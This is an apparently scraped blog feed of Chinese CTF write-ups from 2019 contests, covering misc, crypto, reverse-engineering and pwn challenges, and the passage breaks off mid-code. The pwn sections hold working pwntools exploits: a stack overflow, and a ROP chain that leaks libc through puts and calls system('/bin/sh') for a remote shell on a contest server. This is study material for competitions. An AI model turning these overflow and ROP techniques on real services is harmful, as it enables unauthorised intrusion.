class="number">0048</span>| </span><br><span class="line"><span class="number">0056</span>| <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="number">0064</span>| fantasy_addr</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">conn</span>=process('./fantasy')</span><br><span class="line"><span class="attribute">conn</span>=remote('183.129.189.60','10025')</span><br><span class="line"></span><br><span class="line"><span class="attribute">payload</span>=<span class="string">'a'</span>*0x30+p64(0xdeadbeef)+p64(0x400735)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>python 跑下便可以拿到flag</p><blockquote><p>python fantasy.py<br><br>GXY{Welcome_to_Binary_world}<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKqo9.png" alt="QxKqo9.png"></p></blockquote><h3 id="0x05：fu"><a href="#0x05：fu" class="headerlink" title="0x05：fu"></a>0x05：fu</h3><blockquote><p>看题目联想到了  与佛论禅！<br></p></blockquote><p>下载得到的是一个压缩包，里面有一个图片和一个加密的fo.txt文本，如下图：<br><br><img src="https://s2.ax1x.com/2019/12/22/QxKOiR.png" alt="QxKOiR.png"><br><br>我首先想到的是用明文攻击 ，做这题，但却失败告终！<br><br>这题其实直接修复下 下载的压缩包，就可以的<br><img src="https://s2.ax1x.com/2019/12/22/QxKXJ1.png" alt="QxKXJ1.png"><br>然后就得到 修复后的 rebuilt.fu.zip<br><img src="https://s2.ax1x.com/2019/12/22/QxKjRx.png" alt="QxKjRx.png"><br><br>然后打开 fo.txt文本，果然不出我们所料，然后我们将  佛曰内容进行解密即可！<br><img src="https://s2.ax1x.com/2019/12/22/QxKvz6.png" alt="QxKvz6.png"></p><blockquote><p>佛曰：遮等諳勝能礙皤藐哆娑梵迦侄羅哆迦梵者梵楞蘇涅侄室實真缽朋能。奢怛俱道怯都諳怖梵尼怯一罰心缽謹缽薩苦奢夢怯帝梵遠朋陀諳陀穆諳所呐知涅侄以薩怯想夷奢醯數羅怯諸</p></blockquote><p>与佛论禅网址：<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br><img src="https://s2.ax1x.com/2019/12/22/QxKzQK.png" alt="QxKzQK.png"></p><blockquote><p>flag：flag{w0_fo_ci_Be1}</p></blockquote><h3 id="0x06：base乱码"><a href="#0x06：base乱码" class="headerlink" title="0x06：base乱码"></a>0x06：base乱码</h3><blockquote><p>这题 首先给了我们这么多行的base64编码的字符串</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Q2V0dGUgbnVpdCwK</span><br><span class="line">SW50ZW5hYmxlIGluc29tbmllLAp=</span><br><span class="line">TGEgZm9saWUgbWUgZ3VldHRlLAo=</span><br><span class="line">SmUgc3VpcyBjZSBxdWUgamUgZnVpcwp=</span><br><span class="line">SmUgc3ViaXMsCt==</span><br><span class="line">Q2V0dGUgY2Fjb3Bob25pZSwK</span><br><span class="line">UXVpIG1lIHNjaWUgbGEgdOmUmnRlLAp=</span><br><span class="line">QXNzb21tYW50ZSBoYXJtb25pZSwK</span><br><span class="line">RWxsZSBtZSBkaXQsCo==</span><br><span class="line">VHUgcGFpZXJhcyB0ZXMgZGVsaXRzLAp=</span><br><span class="line">UXVvaSBxdSdpbCBhZHZpZW5uZSwK</span><br><span class="line">T24gdHJh5Y2vbmUgc2VzIGNoYeWNr25lcywK</span><br><span class="line">U2VzIHBlaW5lcywK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCm==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCl==</span><br><span class="line">QXV4IHJlcXVpZW1zLAr=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAq=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCt==</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCp==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCp==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCo==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCl==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">TCdlbm5lbWksCu==</span><br><span class="line">VGFwaSBkYW5zIG1vbiBlc3ByaXQsCp==</span><br><span class="line">RumUmnRlIG1lcyBkZWZhaXRlcywK</span><br><span class="line">U2FucyByZXBpdCBtZSBkZWZpZSwK</span><br><span class="line">SmUgcmVuaWUsCq==</span><br><span class="line">TGEgZmF0YWxlIGhlcmVzaWUsCh==</span><br><span class="line">UXVpIHJvbmdlIG1vbiDplJp0cmUsCo==</span><br><span class="line">SmUgdmV1eCByZW5h5Y2vdHJlLAp=</span><br><span class="line">UmVuYeWNr3RyZSwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCn==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCq==</span><br><span class="line">QXV4IHJlcXVpZW1zLAp=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAq=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCo==</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCm==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCl==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCm==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCu==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">UGxldXJlbnQgbGVzIHZpb2xvbnMgZGUgbWEgdmllLAp=</span><br><span class="line">TGEgdmlvbGVuY2UgZGUgbWVzIGVudmllcywK</span><br><span class="line">U2lwaG9ubmVlIHN5bXBob25pZSwK</span><br><span class="line">RGVjb25jZXJ0YW50IGNvbmNlcnRvLAq=</span><br><span class="line">SmUgam91ZSBzYW5zIHRvdWNoZXIgbGUgRG8sCo==</span><br><span class="line">TW9uIHRhbGVudCBzb25uZSBmYXV4LAp=</span><br><span class="line">SmUgbm9pZSBtb24gZW5udWksCo==</span><br><span class="line">RGFucyBsYSBtZWxvbWFuaWUsCl==</span><br><span class="line">SmUgdHVlIG1lcyBwaG9iaWVzLAq=</span><br><span class="line">RGFucyBsYSBkZXNoYXJtb25pZSwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCv==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCn==</span><br><span class="line">QXV4IHJlcXVpZW1zLAp=</span><br><span class="line">VHVhbnQgcGFyIGRlcGl0LAo=</span><br><span class="line">Q2UgcXVlIGplIHNlbWUsCm==</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCp==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUsCm==</span><br><span class="line">RXQgYXV4IGJsYXNwaGVtZXMsCu==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCm==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudCwK</span><br><span class="line">SmUgdm91ZSBtZXMgbnVpdHMsCn==</span><br><span class="line">QSBsJ2Fzc2FzeW1waG9uaWUgKGwnYXNzYXN5bXBob25pZSksCn==</span><br><span class="line">Sidhdm91ZSBqZSBtYXVkaXMsCt==</span><br><span class="line">VG91cyBjZXV4IHF1aSBzJ2FpbWVudA==</span><br></pre></td></tr></table></figure><blockquote><p>这题，我们 首先对它进行base64解密，得到的是莫扎特的一首音乐歌词，<br>有兴趣的朋友可以听听看！<br><img src="https://s2.ax1x.com/2019/12/22/QxMpLD.png" alt="QxMpLD.png"></p></blockquote><p>我从中没有得出 有用的信息，于是想到base64隐写<br><br>我们将上面base64编码的多行字符串，命名为1.txt<br><br>我们写如下代码，将其隐写的内容给输出 出来：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#codin<span class="variable">g:utf8</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">#http<span class="variable">s:</span>//tr0y.wang/<span class="number">2017</span>/<span class="number">06</span>/<span class="number">14</span>/Base64steg/</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> in <span class="keyword">f</span>.readlines():</span><br><span class="line">        stegb64 = <span class="string">''</span>.<span class="keyword">join</span>(<span class="built_in">line</span>.<span class="keyword">split</span>())</span><br><span class="line">        rowb64 = <span class="string">''</span>.<span class="keyword">join</span>(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).<span class="keyword">split</span>())</span><br><span class="line"></span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.<span class="built_in">index</span>(stegb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[-<span class="number">1</span>]) - b64chars.<span class="built_in">index</span>(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.<span class="built_in">count</span>(<span class="string">'='</span>)  # <span class="keyword">no</span> equalnum <span class="keyword">no</span> offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.<span class="keyword">join</span>([chr(<span class="keyword">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i in xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])  # <span class="number">8</span>位一组</span><br></pre></td></tr></table></figure><p>直接跑出来flag了</p><blockquote><p>flag：GXY{fazhazhenhaoting}</p></blockquote><h3 id="0x07：checkin"><a href="#0x07：checkin" class="headerlink" title="0x07：checkin"></a>0x07：checkin</h3><blockquote><p>签到题，我把它放到最后了， Rot47加解密，平常很少碰到，长见识了！<br><br>对它的识别，我想应该是在与  Rot47加密 通常会含有多个 ‘@’字符吧！</p></blockquote><p>首先，题目给了我们</p><blockquote><p>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</p></blockquote><p>对其进行base64解密 得到</p><blockquote><p>v)<em>L</em>_F0&lt;}@H0&gt;F49023@FE0#@EN</p></blockquote><p>再对其进行 Rot47 解密便得到flag</p><blockquote><p>GXY{Y0u_kNow_much_about_Rot}</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2019GXYCTF于昨天晚上结束,做得很是糟糕！一段时间 不做题，pwn快忘完了！难受，不过还是先准备期末考试吧！&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf_wp" scheme="http://yoursite.com/tags/ctf-wp/"/>
    
  </entry>
  
  <entry>
    <title>2019 广外_wp0</title>
    <link href="http://yoursite.com/2019/12/01/2019%20%E5%B9%BF%E5%A4%96_wp0/"/>
    <id>http://yoursite.com/2019/12/01/2019 广外_wp0/</id>
    <published>2019-12-01T08:06:10.000Z</published>
    <updated>2019-12-01T08:09:47.170Z</updated>
    
    <content type="html"><![CDATA[<p>以md形式上交wp！觉得要比word形式实用的多！</p><a id="more"></a><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="miscfun"><a href="#miscfun" class="headerlink" title="miscfun"></a>miscfun</h2><blockquote><p>这道杂项应该是考察pwntools的使用，程序逻辑是石头剪刀布游戏，第一次要求我们要赢它，第二次要求我们要输给它，第三次要求我们与它出的 一样，然后这三次为一轮，循环32轮！</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">字符或者数字代表意义如下：</span></span><br><span class="line"><span class="number">1</span><span class="string">：赢他</span></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">输它</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">一样</span></span><br><span class="line"></span><br><span class="line"><span class="string">r：石头</span>  <span class="string">p:布</span>   <span class="attr">s:</span>  <span class="string">剪刀</span></span><br></pre></td></tr></table></figure><blockquote><p>所以我们  写python脚本：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"183.129.189.60"</span>,<span class="number">10035</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):                    <span class="comment">#循环32轮</span></span><br><span class="line">r.recvuntil(<span class="string">"This time I'll take "</span>)</span><br><span class="line">s = r.recv(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'*'</span>*<span class="number">10</span> + str(s) + <span class="string">'*'</span>*<span class="number">10</span> )</span><br><span class="line">r.recvuntil(<span class="string">"what's your choice"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">3</span> == <span class="number">1</span>:                  <span class="comment">#赢他</span></span><br><span class="line"><span class="keyword">if</span> s == <span class="string">'r'</span> :</span><br><span class="line">r.sendline(<span class="string">"p"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'p'</span>:</span><br><span class="line">r.sendline(<span class="string">"s"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'s'</span>:</span><br><span class="line">r.sendline(<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">elif</span> (i+<span class="number">1</span>)%<span class="number">3</span> == <span class="number">2</span>:                  <span class="comment">#输它</span></span><br><span class="line"><span class="keyword">if</span> s == <span class="string">'r'</span> :</span><br><span class="line">r.sendline(<span class="string">"s"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'p'</span>:</span><br><span class="line">r.sendline(<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'s'</span>:</span><br><span class="line">r.sendline(<span class="string">"p"</span>)</span><br><span class="line"><span class="keyword">elif</span> (i+<span class="number">1</span>)%<span class="number">3</span> == <span class="number">0</span>:                   <span class="comment">#一样</span></span><br><span class="line"><span class="keyword">if</span> s == <span class="string">'r'</span> :</span><br><span class="line">r.sendline(<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'p'</span>:</span><br><span class="line">r.sendline(<span class="string">"p"</span>)</span><br><span class="line"><span class="keyword">elif</span> s == <span class="string">'s'</span>:</span><br><span class="line">r.sendline(<span class="string">"s"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>结果：<br><img src="https://s2.ax1x.com/2019/12/01/QeseBV.png" alt="QeseBV.png"></p></blockquote><h2 id="misc1（math-应该题目名字是这个-）"><a href="#misc1（math-应该题目名字是这个-）" class="headerlink" title="misc1（math(应该题目名字是这个)）"></a>misc1（math(应该题目名字是这个)）</h2><blockquote><p>当我看到这道题的时候，我甚至觉得我在做pwn题目，又得使用pwntools，而这题目的逻辑是 运行150次运算，运算式子 是    v=v1*v2-v3+v4   其中 * - + 三个运算符是固定不变的，我们仅需要用pwntools工具获取到 每次运算的 v1,v2,v3,v4，然后计算即可！</p></blockquote><blockquote><p>于是python脚本如下：</p></blockquote><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">#coding</span>:utf8</span><br><span class="line"><span class="symbol">from</span> pwn <span class="meta">import</span> *</span><br><span class="line"><span class="symbol">context.log_level</span> = <span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">"183.129.189.60"</span>,<span class="number">10034</span>)</span><br><span class="line"><span class="symbol">for</span> i in range(<span class="number">150</span>):</span><br><span class="line">r.recvuntil(<span class="string">"Math problem: "</span>)</span><br><span class="line"><span class="built_in">v1</span> = r.recvuntil(<span class="string">" * "</span>)[:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">v1</span> = int(<span class="keyword">str(v1))</span></span><br><span class="line"><span class="keyword"></span><span class="built_in">v2</span> = r.recvuntil(<span class="string">" - "</span>)[:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">v2</span> = int(<span class="keyword">str(v2))</span></span><br><span class="line"><span class="keyword"></span><span class="built_in">v3</span> = r.recvuntil(<span class="string">" + "</span>)[:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">v3</span> = int(<span class="keyword">str(v3))</span></span><br><span class="line"><span class="keyword"></span><span class="built_in">v4</span> = r.recvuntil(<span class="string">" = "</span>)[:-<span class="number">3</span>]</span><br><span class="line"><span class="built_in">v4</span> = int(<span class="keyword">str(v4))</span></span><br><span class="line"><span class="keyword"></span>v = <span class="built_in">v1</span> * <span class="built_in">v2</span> - <span class="built_in">v3</span> + <span class="built_in">v4</span></span><br><span class="line">r.recvuntil(<span class="string">"your answer:"</span>)</span><br><span class="line">r.sendline(<span class="keyword">str(v))</span></span><br><span class="line"><span class="keyword">r.interactive()#flag：b3ddbc502e307665f346cbd6e52cc10d</span></span><br></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="宇宙无敌难-jian-搞-dan"><a href="#宇宙无敌难-jian-搞-dan" class="headerlink" title="宇宙无敌难(jian)搞(dan)"></a>宇宙无敌难(jian)搞(dan)</h2><blockquote><p>这道题，无敌难搞，详见脚本，如下：</p></blockquote><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"><span class="comment">#r = process('./jiandan')</span></span><br><span class="line">r = remote(<span class="string">"183.129.189.60"</span>,10026)</span><br><span class="line">file = ELF('./jiandan')</span><br><span class="line"></span><br><span class="line">puts_plt = file.plt['puts']</span><br><span class="line"><span class="comment">#puts_got = file.got['puts']</span></span><br><span class="line">pop_rdi = 0x400873</span><br><span class="line">bss1=file.bss()+0x100</span><br><span class="line"></span><br><span class="line">def tijiao(def_name):                                    <span class="comment">#泄露函数真实地址 定义一个函数</span></span><br><span class="line">got_add = file.got[def_name]</span><br><span class="line">payload ='a'*268+p32(269)+p64(bss1)</span><br><span class="line">payload += p64(pop_rdi) + p64(got_add) + p64(puts_plt)</span><br><span class="line">payload += p64(0x00000000004007e7)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Hack 4 fun!\n"</span>,payload)</span><br><span class="line"></span><br><span class="line">def_name_addr = u64(r.recv(6).ljust(8,'\x00'))</span><br><span class="line">print('*'*10 + str(def_name) + <span class="string">":"</span> + hex(def_name_addr) + '*'*10)</span><br><span class="line">return def_name_addr</span><br><span class="line"></span><br><span class="line">puts_addr = tijiao('puts')                              <span class="comment">#调用上面函数  获取到puts函数真实地址</span></span><br><span class="line">fgetc_addr = tijiao('fgetc')<span class="comment">#同理，调用上面函数  获取到fgetss函数真实地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')           <span class="comment">#泄漏libc 将其 放在同一目录下</span></span><br><span class="line">libc_base = puts_addr - libc.symbols['puts']</span><br><span class="line">system_addr = libc_base + libc.symbols['system']</span><br><span class="line">binsh_addr = libc_base + libc.search('/bin/sh').next() <span class="comment">#获取 system  binsh  真实地址</span></span><br><span class="line"></span><br><span class="line">payload ='a'*268+p32(269)+p64(bss1)                    <span class="comment">#构造payload</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">payload += p64(0x00000000004007e7)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">"Hack 4 fun!\n"</span>,payload)               <span class="comment">#getshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#def_name_addr = u64(r.recv(6).ljust(8,'\x00'))</span></span><br><span class="line"></span><br><span class="line">r.interactive()<span class="comment">#flag： 91530b023f643172df275bb959f91862</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/01/QesZn0.png" alt="QesZn0.png"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h2><blockquote><p>下载后发现是 pyc 文件，于是将它拖到Easy Python Decompiler  工具得到 反编译后的python源代码</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Embedded <span class="keyword">file</span> name: encode.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Welcome to Re World!'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your input1 is your flag~'</span></span><br><span class="line"><span class="keyword">l</span> = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">l</span>):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">l</span> - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> code</span><br><span class="line">code = [<span class="string">'\x1f'</span>,<span class="string">'\x12'</span>,<span class="string">'\x1d'</span>,<span class="string">'('</span>,<span class="string">'0'</span>,<span class="string">'4'</span>,<span class="string">'\x01'</span>,<span class="string">'\x06'</span>,<span class="string">'\x14'</span>,<span class="string">'4'</span>,<span class="string">','</span>,<span class="string">'\x1b'</span>,<span class="string">'U'</span>,<span class="string">'?'</span>,<span class="string">'o'</span>,<span class="string">'6'</span>,<span class="string">'*'</span>,<span class="string">':'</span>,<span class="string">'\x01'</span>,<span class="string">'D'</span>,<span class="string">';'</span>,<span class="string">'%'</span>,<span class="string">'\x13'</span>]</span><br></pre></td></tr></table></figure><blockquote><p>算法 是 将我们的flag(输入)进行  code[i] = flag[i] + i    然后   code[i] = code[i]  ^ code[i + 1]  得到 code</p></blockquote><ol><li><blockquote><p>所以，我们先将最后的code得到都转化为 10进制</p></blockquote></li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">'\x1f'</span>,<span class="string">'\x12'</span>,<span class="string">'\x1d'</span>,<span class="string">'('</span>,<span class="string">'0'</span>,<span class="string">'4'</span>,<span class="string">'\x01'</span>,<span class="string">'\x06'</span>,<span class="string">'\x14'</span>,<span class="string">'4'</span>,<span class="string">','</span>,<span class="string">'\x1b'</span>,<span class="string">'U'</span>,<span class="string">'?'</span>,<span class="string">'o'</span>,<span class="string">'6'</span>,<span class="string">'*'</span>,<span class="string">':'</span>,<span class="string">'\x01'</span>,<span class="string">'D'</span>,<span class="string">';'</span>,<span class="string">'%'</span>,<span class="string">'\x13'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(code)#<span class="number">23</span></span><br><span class="line">code_10=[]</span><br><span class="line">ss=[<span class="string">'('</span>,<span class="string">'0'</span>,<span class="string">'4'</span>,<span class="string">'4'</span>,<span class="string">','</span>,<span class="string">'U'</span>,<span class="string">'?'</span>,<span class="string">'o'</span>,<span class="string">'6'</span>,<span class="string">'*'</span>,<span class="string">':'</span>,<span class="string">'D'</span>,<span class="string">';'</span>,<span class="string">'%'</span>]</span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">range</span>(<span class="number">23</span>):</span><br><span class="line">    <span class="keyword">if</span>(code[i] in ss):</span><br><span class="line">    code_10.<span class="built_in">append</span>(ord(code[i]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    code_10.<span class="built_in">append</span>(<span class="keyword">int</span>(code[i].encode(<span class="string">'hex'</span>),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span> code_10#[<span class="number">31</span>, <span class="number">18</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">20</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">27</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">111</span>, <span class="number">54</span>, <span class="number">42</span>, <span class="number">58</span>, <span 